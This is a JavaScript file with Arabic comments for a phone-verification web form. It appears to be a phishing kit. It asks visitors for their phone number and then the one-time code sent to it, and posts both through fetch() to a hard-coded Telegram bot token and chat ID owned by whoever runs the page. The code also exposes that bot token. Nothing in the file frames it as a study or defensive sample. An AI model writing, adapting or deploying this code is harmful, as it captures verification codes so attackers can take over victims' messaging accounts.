// بيانات رموز الدول (يمكن استبدالها بمكتبة مثل country-data)
const countryCodes = [
    { name: "اليمن", code: "+967" },
    { name: "السعودية", code: "+966" },
    { name: "الإمارات", code: "+971" },
    { name: "مصر", code: "+20" },
    { name: "الولايات المتحدة", code: "+1" },
    // يمكنك إضافة المزيد من الدول هنا
];

// ملء قائمة الدول
const countrySelect = document.getElementById('country');
countryCodes.forEach(country => {
    const option = document.createElement('option');
    option.value = country.code;
    option.textContent = `${country.name} (${country.code})`;
    countrySelect.appendChild(option);
});

// إرسال رقم الهاتف
document.getElementById('phoneForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const countryCode = document.getElementById('country').value;
    const phoneNumber = document.getElementById('phone').value;

    if (!phoneNumber) {
        alert('يرجى إدخال رقم الهاتف');
        return;
    }

    const fullNumber = `${countryCode}${phoneNumber}`;
    alert(`تم إرسال الكود إلى الرقم: ${fullNumber}`);

    // إرسال البيانات إلى بوت Telegram
    sendToTelegram(`تم إرسال الكود إلى الرقم: ${fullNumber}`);

    // إظهار حقل إدخال الكود
    document.getElementById('phoneForm').style.display = 'none';
    document.getElementById('codeForm').style.display = 'block';
});

// إرسال الكود
document.getElementById('codeForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const code = document.getElementById('code').value;

    if (!code) {
        alert('يرجى إدخال الكود');
        return;
    }

    alert(`تم إرسال الكود: ${code}`);

    // إرسال الكود إلى بوت Telegram
    sendToTelegram(`تم إدخال الكود: ${code}`);
});

// دالة لإرسال الرسائل إلى بوت Telegram
function sendToTelegram(message) {
    const botToken = '7352087691:AAFKetidCGiN16_Vk1jCqtn04_Kh9cE--k0'; // استبدل ب Token البوت الخاص بك
    const chatId = '7302541527'; // استبدل ب Chat ID الخاص بك

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const data = {
        chat_id: chatId,
        text: message
    };

    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(result => {
        console.log('تم إرسال الرسالة إلى Telegram:', result);
    })
    .catch(error => {
        console.error('خطأ في الإرسال:', error);
    });
                                          }
